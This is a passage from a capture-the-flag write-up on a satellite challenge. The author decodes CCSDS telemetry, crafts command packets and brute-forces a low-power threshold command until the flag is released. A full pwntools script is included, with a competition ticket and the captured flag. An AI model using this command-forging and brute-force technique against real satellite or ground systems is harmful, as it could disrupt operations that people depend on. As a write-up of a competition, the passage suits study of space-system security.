<p>If you see the code, I also implemented it to find which telemetry server to connect. So it basically connects to the main server, presents the ticket, gets the address of the telemetery server and then operates the telemetry server. I also let the EPS and FLAG decoder enabled on this one.</p>

<p><img src="/assets/posts/medium/1_J86N_zazHwBqairuHCIlgg.png" alt="Realtime Telemetry Decoding" /><em>Realtime Telemetry Decoding</em></p>

<p>Then I made a function called SendEnables which would send data back to the satellite trying to enable the flag.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">SendEnables</span><span class="p">():</span>
  <span class="n">r</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">EncodeHeader</span><span class="p">()</span> <span class="o">+</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x00\x02\x01</span><span class="s">"</span><span class="p">)</span> <span class="c1"># Payload
</span>
  <span class="c1"># (...)
</span>  <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
  <span class="k">try</span><span class="p">:</span>
    <span class="n">SendEnables</span><span class="p">()</span>
    <span class="n">data</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">recv</span><span class="p">()</span>
    <span class="c1"># (...)
</span></code></pre></div></div>

<p>The first two bytes are the restriction imposed by the EnableFLAG command according to XTCE. The third byte represents the PowerState in which value 1 is for POWER ON state.</p>

<p>Sadly, that didn’t worked. The satellite seemed to be ignoring the command since the BAD_CMD_COUNT field wasn’t increasing. Then I started playing with other enables. I noticed that the voltage value was increasing every time I received a EPS packet. According to the doc this value is a two byte encoded float in some weird way.</p>

<p><img src="/assets/posts/medium/1_FJ_GNpNWFstomDCulVZs_w.png" alt="VoltageType definition" /><em>VoltageType definition</em></p>

<p>I tried for a few hours to understand what that that meant. I couldn’t figure out so I just decoded as a uint16. I couldn’t figure out to calculate so I just assumed its a normal uint16 that would have direct correlation to voltage itself.</p>

<p>So I imagine that it was some sort of voltage related issue since when the voltage value reached the same value as LOW_POWER_THRESH the connection went off. So I decided to encode the command to send the LOW_POWER_THRESH change values.</p>

<p><img src="/assets/posts/medium/1_ny8lIZj3RH0JmfHMkPrrhQ.png" alt="LOW_PWR_THRES command" /><em>LOW_PWR_THRES command</em></p>

<p>Since that would have PLENGTH =3, I did another function to create the header (yes, I was lazy).</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">EncodeHeader2</span><span class="p">():</span>
  <span class="n">data</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">(</span><span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span> <span class="o">*</span> <span class="mi">6</span><span class="p">)</span>
  <span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">enableflag</span><span class="p">[</span><span class="s">"c_version"</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="mi">5</span><span class="p">)</span> <span class="o">+</span> <span class="p">(</span><span class="n">enableflag</span><span class="p">[</span><span class="s">"c_type"</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="mi">4</span><span class="p">)</span> <span class="o">+</span> <span class="p">(</span><span class="n">enableflag</span><span class="p">[</span><span class="s">"c_sechd"</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="mi">3</span><span class="p">)</span> <span class="o">+</span> <span class="p">((</span><span class="n">enableflag</span><span class="p">[</span><span class="s">"c_apid"</span><span class="p">]</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0x7</span><span class="p">)</span>
  <span class="n">data</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">enableflag</span><span class="p">[</span><span class="s">"c_apid"</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0xFF</span>
  <span class="n">data</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">enableflag</span><span class="p">[</span><span class="s">"c_gpflags"</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="mi">6</span><span class="p">)</span> <span class="o">+</span> <span class="p">(</span><span class="n">enableflag</span><span class="p">[</span><span class="s">"c_gpflags"</span><span class="p">]</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span><span class="p">)</span>
  <span class="n">data</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="n">enableflag</span><span class="p">[</span><span class="s">"c_ssc"</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0xFF</span>
  <span class="n">data</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="mi">3</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span>
  <span class="n">data</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="mi">3</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFF</span>
  <span class="k">return</span> <span class="n">data</span>

<span class="c1"># (...)
</span><span class="n">r</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">EncodeHeader2</span><span class="p">()</span> <span class="o">+</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x00\x0C</span><span class="s">"</span> <span class="o">+</span> <span class="n">struct</span><span class="p">.</span><span class="n">pack</span><span class="p">(</span><span class="s">"&gt;H"</span><span class="p">,</span> <span class="mi">1000</span><span class="p">))</span> <span class="c1"># LW_PWR_THRES
</span></code></pre></div></div>

<p>And since I had no clue how to encode that, I send some random values (like 65535, 0, 32768). All of them were incrementing the BAD_CMD_COUNT which probably mean that I was not encoding valid values. So I decided a bruteforce approach to find out which values were valid.</p>

<p>Since it was slow, I decided to send 100 commands each time send enable was calculated.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">SendEnables</span><span class="p">():</span>
  <span class="k">global</span> <span class="n">s</span>
  <span class="k">print</span><span class="p">(</span><span class="s">"Sending enable %d"</span> <span class="o">%</span> <span class="n">s</span><span class="p">)</span>
  <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">100</span><span class="p">):</span>
    <span class="n">r</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">EncodeHeader2</span><span class="p">()</span> <span class="o">+</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x00\x0C</span><span class="s">"</span> <span class="o">+</span> <span class="n">struct</span><span class="p">.</span><span class="n">pack</span><span class="p">(</span><span class="s">"&gt;H"</span><span class="p">,</span> <span class="n">s</span><span class="p">))</span> <span class="c1"># LW_PWR_THRES
</span>    <span class="n">s</span> <span class="o">+=</span> <span class="mi">1</span>
</code></pre></div></div>

<p>I was only expecting it to not increment the BAD_CMD_COUNT sometime, so I could find out the range of valid values. But after it reached 1200</p>

<p><img src="/assets/posts/medium/1_rbUMCcuP6CmzB1Dh1lqmxg.png" alt="FLAG FOUND!" /><em>FLAG FOUND!</em></p>

<p>The flag poped out!</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>flag{delta76170foxtrot:GJiGsdjw9Kdc5UONnu06i42WeTMVNH1OzOKJTzIq6lJPbLCtb3AsRu2YUVGn-Slb2vnXh2vLC36D-xvKISAKD68}\x00\x19\x03\x00\x03@)L}
</code></pre></div></div>

<p>There was a very big moment of laugh in my team because of that (we were in discord and everyone was seeing my screen in that moment). That must not be a safe way to control a satellite :P</p>

<p>Full Script</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="kn">import</span> <span class="nn">sys</span><span class="p">,</span> <span class="n">struct</span><span class="p">,</span> <span class="n">binascii</span>

<span class="kn">from</span> <span class="nn">pprint</span> <span class="kn">import</span> <span class="n">pprint</span>


<span class="n">APID_FLAG_PACKET</span> <span class="o">=</span> <span class="mi">102</span>
<span class="n">APID_EPS_PACKET</span> <span class="o">=</span> <span class="mi">103</span>
<span class="n">APID_PAYLOAD_PACKET</span> <span class="o">=</span> <span class="mi">105</span>

<span class="n">enableflag</span> <span class="o">=</span> <span class="p">{</span>
  <span class="s">"c_version"</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span>
  <span class="s">"c_type"</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span>
  <span class="s">"c_sechd"</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span>
  <span class="s">"c_gpflags"</span><span class="p">:</span> <span class="mi">3</span><span class="p">,</span>
  <span class="s">"c_apid"</span><span class="p">:</span> <span class="mi">103</span><span class="p">,</span>
  <span class="s">"c_ssc"</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span>
  <span class="s">"c_plen"</span><span class="p">:</span> <span class="mi">2</span>
<span class="p">}</span>

<span class="k">def</span> <span class="nf">EncodeHeader</span><span class="p">():</span>
  <span class="n">data</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">(</span><span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span> <span class="o">*</span> <span class="mi">6</span><span class="p">)</span>
  <span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">enableflag</span><span class="p">[</span><span class="s">"c_version"</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="mi">5</span><span class="p">)</span> <span class="o">+</span> <span class="p">(</span><span class="n">enableflag</span><span class="p">[</span><span class="s">"c_type"</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="mi">4</span><span class="p">)</span> <span class="o">+</span> <span class="p">(</span><span class="n">enableflag</span><span class="p">[</span><span class="s">"c_sechd"</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="mi">3</span><span class="p">)</span> <span class="o">+</span> <span class="p">((</span><span class="n">enableflag</span><span class="p">[</span><span class="s">"c_apid"</span><span class="p">]</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0x7</span><span class="p">)</span>
  <span class="n">data</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">enableflag</span><span class="p">[</span><span class="s">"c_apid"</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0xFF</span>
  <span class="n">data</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">enableflag</span><span class="p">[</span><span class="s">"c_gpflags"</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="mi">6</span><span class="p">)</span> <span class="o">+</span> <span class="p">(</span><span class="n">enableflag</span><span class="p">[</span><span class="s">"c_gpflags"</span><span class="p">]</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span><span class="p">)</span>
  <span class="n">data</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="n">enableflag</span><span class="p">[</span><span class="s">"c_ssc"</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0xFF</span>
  <span class="n">data</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">enableflag</span><span class="p">[</span><span class="s">"c_plen"</span><span class="p">])</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span>
  <span class="n">data</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">enableflag</span><span class="p">[</span><span class="s">"c_plen"</span><span class="p">])</span> <span class="o">&amp;</span> <span class="mh">0xFF</span>
  <span class="k">return</span> <span class="n">data</span>

<span class="k">def</span> <span class="nf">EncodeHeader2</span><span class="p">():</span>
  <span class="n">data</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">(</span><span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span> <span class="o">*</span> <span class="mi">6</span><span class="p">)</span>
  <span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">enableflag</span><span class="p">[</span><span class="s">"c_version"</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="mi">5</span><span class="p">)</span> <span class="o">+</span> <span class="p">(</span><span class="n">enableflag</span><span class="p">[</span><span class="s">"c_type"</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="mi">4</span><span class="p">)</span> <span class="o">+</span> <span class="p">(</span><span class="n">enableflag</span><span class="p">[</span><span class="s">"c_sechd"</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="mi">3</span><span class="p">)</span> <span class="o">+</span> <span class="p">((</span><span class="n">enableflag</span><span class="p">[</span><span class="s">"c_apid"</span><span class="p">]</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0x7</span><span class="p">)</span>
  <span class="n">data</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">enableflag</span><span class="p">[</span><span class="s">"c_apid"</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0xFF</span>
  <span class="n">data</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">enableflag</span><span class="p">[</span><span class="s">"c_gpflags"</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="mi">6</span><span class="p">)</span> <span class="o">+</span> <span class="p">(</span><span class="n">enableflag</span><span class="p">[</span><span class="s">"c_gpflags"</span><span class="p">]</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span><span class="p">)</span>
  <span class="n">data</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="n">enableflag</span><span class="p">[</span><span class="s">"c_ssc"</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0xFF</span>
  <span class="n">data</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="mi">3</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span>
  <span class="n">data</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="mi">3</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFF</span>
  <span class="k">return</span> <span class="n">data</span>


<span class="k">def</span> <span class="nf">DecodeHeader</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
  <span class="n">c_version</span> <span class="o">=</span> <span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0xE0</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">5</span>
  <span class="n">c_type</span> <span class="o">=</span> <span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0x10</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">4</span>
  <span class="n">c_sechd</span> <span class="o">=</span> <span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0x8</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">3</span>
  <span class="n">c_apid</span> <span class="o">=</span> <span class="p">((</span><span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0x7</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="n">data</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
  <span class="n">c_gpflags</span> <span class="o">=</span> <span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0xC0</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">6</span>
  <span class="n">c_ssc</span> <span class="o">=</span> <span class="p">((</span><span class="n">data</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0x3F</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="n">data</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span>
  <span class="n">c_plen</span> <span class="o">=</span> <span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span><span class="o">&lt;&lt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">5</span><span class="p">])</span>
  <span class="k">return</span> <span class="n">c_version</span><span class="p">,</span> <span class="n">c_type</span><span class="p">,</span> <span class="n">c_sechd</span><span class="p">,</span> <span class="n">c_apid</span><span class="p">,</span> <span class="n">c_gpflags</span><span class="p">,</span> <span class="n">c_ssc</span><span class="p">,</span> <span class="n">c_plen</span>

<span class="k">def</span> <span class="nf">DecodeFlag</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
  <span class="n">bitstream</span> <span class="o">=</span> <span class="p">[]</span>
  <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)):</span>
    <span class="k">for</span> <span class="n">b</span> <span class="ow">in</span> <span class="nb">format</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="s">"08b"</span><span class="p">):</span>
      <span class="n">bitstream</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">b</span><span class="p">)</span>

  <span class="n">flagdata</span> <span class="o">=</span> <span class="s">""</span>

  <span class="k">while</span> <span class="nb">len</span><span class="p">(</span><span class="n">bitstream</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">:</span>
    <span class="n">b</span> <span class="o">=</span> <span class="s">""</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>
      <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">bitstream</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">i</span><span class="p">:</span>
        <span class="n">b</span> <span class="o">+=</span> <span class="n">bitstream</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>

    <span class="k">if</span> <span class="n">b</span> <span class="o">!=</span> <span class="s">""</span><span class="p">:</span>
      <span class="n">flagdata</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">b</span><span class="p">,</span> <span class="mi">2</span><span class="p">))</span>
    <span class="n">bitstream</span> <span class="o">=</span> <span class="n">bitstream</span><span class="p">[</span><span class="mi">7</span><span class="p">:]</span>

  <span class="k">return</span> <span class="n">flagdata</span>

<span class="k">def</span> <span class="nf">DecodeEPS</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
  <span class="n">battemp</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="mi">2</span><span class="p">]</span>
  <span class="n">voltage</span> <span class="o">=</span> <span class="p">(</span><span class="n">struct</span><span class="p">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">"&gt;H"</span><span class="p">,</span> <span class="n">data</span><span class="p">[</span><span class="mi">2</span><span class="p">:</span><span class="mi">4</span><span class="p">])[</span><span class="mi">0</span><span class="p">])</span>
  <span class="n">low_pwr_thresh</span> <span class="o">=</span> <span class="p">(</span><span class="n">struct</span><span class="p">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">"&gt;H"</span><span class="p">,</span> <span class="n">data</span><span class="p">[</span><span class="mi">4</span><span class="p">:</span><span class="mi">6</span><span class="p">])[</span><span class="mi">0</span><span class="p">])</span>
  <span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="mi">6</span><span class="p">:]</span>

  <span class="n">LOW_PWR_MODE</span>  <span class="o">=</span> <span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&amp;</span> <span class="p">(</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">0</span><span class="p">))</span> <span class="o">&gt;</span> <span class="mi">0</span>
  <span class="n">BATT_HTR</span>      <span class="o">=</span> <span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&amp;</span> <span class="p">(</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">1</span><span class="p">))</span> <span class="o">&gt;</span> <span class="mi">0</span>
  <span class="n">PAYLOAD_PWR</span>   <span class="o">=</span> <span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&amp;</span> <span class="p">(</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">2</span><span class="p">))</span> <span class="o">&gt;</span> <span class="mi">0</span>
  <span class="n">FLAG_PWR</span>      <span class="o">=</span> <span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&amp;</span> <span class="p">(</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">3</span><span class="p">))</span> <span class="o">&gt;</span> <span class="mi">0</span>
  <span class="n">ADCS_PWR</span>      <span class="o">=</span> <span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&amp;</span> <span class="p">(</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">4</span><span class="p">))</span> <span class="o">&gt;</span> <span class="mi">0</span>
  <span class="n">RADIO1_PWR</span>    <span class="o">=</span> <span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&amp;</span> <span class="p">(</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">5</span><span class="p">))</span> <span class="o">&gt;</span> <span class="mi">0</span>
  <span class="n">RADIO2_PWR</span>    <span class="o">=</span> <span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&amp;</span> <span class="p">(</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">6</span><span class="p">))</span> <span class="o">&gt;</span> <span class="mi">0</span>

  <span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="mi">1</span><span class="p">:]</span>

  <span class="n">PAYLOAD_ENABLE</span> <span class="o">=</span> <span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&amp;</span> <span class="p">(</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">0</span><span class="p">))</span> <span class="o">&gt;</span> <span class="mi">0</span>
  <span class="n">FLAG_ENABLE</span>    <span class="o">=</span> <span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&amp;</span> <span class="p">(</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">1</span><span class="p">))</span> <span class="o">&gt;</span> <span class="mi">0</span>
  <span class="n">ADCS_ENABLE</span>    <span class="o">=</span> <span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&amp;</span> <span class="p">(</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">2</span><span class="p">))</span> <span class="o">&gt;</span> <span class="mi">0</span>
  <span class="n">RADIO1_ENABLE</span>  <span class="o">=</span> <span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&amp;</span> <span class="p">(</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">3</span><span class="p">))</span> <span class="o">&gt;</span> <span class="mi">0</span>
  <span class="n">RADIO2_ENABLE</span>  <span class="o">=</span> <span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&amp;</span> <span class="p">(</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">4</span><span class="p">))</span> <span class="o">&gt;</span> <span class="mi">0</span>

  <span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="mi">1</span><span class="p">:]</span>
  <span class="k">print</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">))</span>
  <span class="n">BAD_CMD_COUNT</span> <span class="o">=</span> <span class="n">struct</span><span class="p">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">"&gt;I"</span><span class="p">,</span> <span class="n">data</span><span class="p">[:</span><span class="mi">4</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>

  <span class="k">return</span> <span class="p">{</span>
    <span class="s">"low_pwr_thresh"</span><span class="p">:</span> <span class="n">low_pwr_thresh</span><span class="p">,</span>
    <span class="s">"voltage"</span><span class="p">:</span> <span class="n">voltage</span><span class="p">,</span>
    <span class="s">"LOW_PWR_MODE"</span><span class="p">:</span> <span class="n">LOW_PWR_MODE</span><span class="p">,</span>
    <span class="s">"BATT_HTR"</span><span class="p">:</span> <span class="n">BATT_HTR</span><span class="p">,</span>
    <span class="s">"PAYLOAD_PWR"</span><span class="p">:</span> <span class="n">PAYLOAD_PWR</span><span class="p">,</span>
    <span class="s">"FLAG_PWR"</span><span class="p">:</span> <span class="n">FLAG_PWR</span><span class="p">,</span>
    <span class="s">"ADCS_PWR"</span><span class="p">:</span> <span class="n">ADCS_PWR</span><span class="p">,</span>
    <span class="s">"RADIO1_PWR"</span><span class="p">:</span> <span class="n">RADIO1_PWR</span><span class="p">,</span>
    <span class="s">"RADIO2_PWR"</span><span class="p">:</span> <span class="n">RADIO2_PWR</span><span class="p">,</span>
    <span class="s">"PAYLOAD_ENABLE"</span><span class="p">:</span> <span class="n">PAYLOAD_ENABLE</span><span class="p">,</span>
    <span class="s">"FLAG_ENABLE"</span><span class="p">:</span> <span class="n">FLAG_ENABLE</span><span class="p">,</span>
    <span class="s">"ADCS_ENABLE"</span><span class="p">:</span> <span class="n">ADCS_ENABLE</span><span class="p">,</span>
    <span class="s">"RADIO1_ENABLE"</span><span class="p">:</span> <span class="n">RADIO1_ENABLE</span><span class="p">,</span>
    <span class="s">"RADIO2_ENABLE"</span><span class="p">:</span> <span class="n">RADIO2_ENABLE</span><span class="p">,</span>
    <span class="s">"BAD_CMD_COUNT"</span><span class="p">:</span> <span class="n">BAD_CMD_COUNT</span><span class="p">,</span>
  <span class="p">}</span>


<span class="n">rv</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">"goose.satellitesabove.me"</span><span class="p">,</span> <span class="mi">5033</span><span class="p">)</span>
<span class="n">rv</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"Ticket please:"</span><span class="p">)</span>
<span class="n">rv</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">"ticket{delta76170foxtrot:GCOmAUq4Fz8K0PQ1qFpviGNJXkI0FmI2eIDZ9BB2EvbrZwD0EoKIt0af4wyrI0W7QA}</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
<span class="n">v</span> <span class="o">=</span> <span class="n">rv</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"Telemetry Service running at "</span><span class="p">)</span>
<span class="n">v</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">rv</span><span class="p">.</span><span class="n">recv</span><span class="p">(),</span> <span class="n">encoding</span><span class="o">=</span><span class="s">"utf8"</span><span class="p">)</span>

<span class="n">host</span><span class="p">,</span> <span class="n">port</span> <span class="o">=</span> <span class="n">v</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">":"</span><span class="p">)</span>
<span class="n">port</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">port</span><span class="p">)</span>

<span class="k">print</span><span class="p">(</span><span class="s">"Connecting %s:%d"</span> <span class="o">%</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>

<span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>

<span class="n">data</span> <span class="o">=</span> <span class="sa">b</span><span class="s">""</span>

<span class="n">s</span> <span class="o">=</span> <span class="mi">0</span>

<span class="k">def</span> <span class="nf">SendEnables</span><span class="p">():</span>
  <span class="k">global</span> <span class="n">s</span>
  <span class="k">print</span><span class="p">(</span><span class="s">"Sending enable %d"</span> <span class="o">%</span> <span class="n">s</span><span class="p">)</span>
  <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">100</span><span class="p">):</span>
    <span class="n">r</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">EncodeHeader2</span><span class="p">()</span> <span class="o">+</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x00\x0C</span><span class="s">"</span> <span class="o">+</span> <span class="n">struct</span><span class="p">.</span><span class="n">pack</span><span class="p">(</span><span class="s">"&gt;H"</span><span class="p">,</span> <span class="n">s</span><span class="p">))</span> <span class="c1"># LW_PWR_THRES
</span>    <span class="n">s</span> <span class="o">+=</span> <span class="mi">1</span>


<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
  <span class="k">try</span><span class="p">:</span>
    <span class="n">SendEnables</span><span class="p">()</span>
    <span class="n">data</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">recv</span><span class="p">()</span>
    <span class="c1"># data += chunk
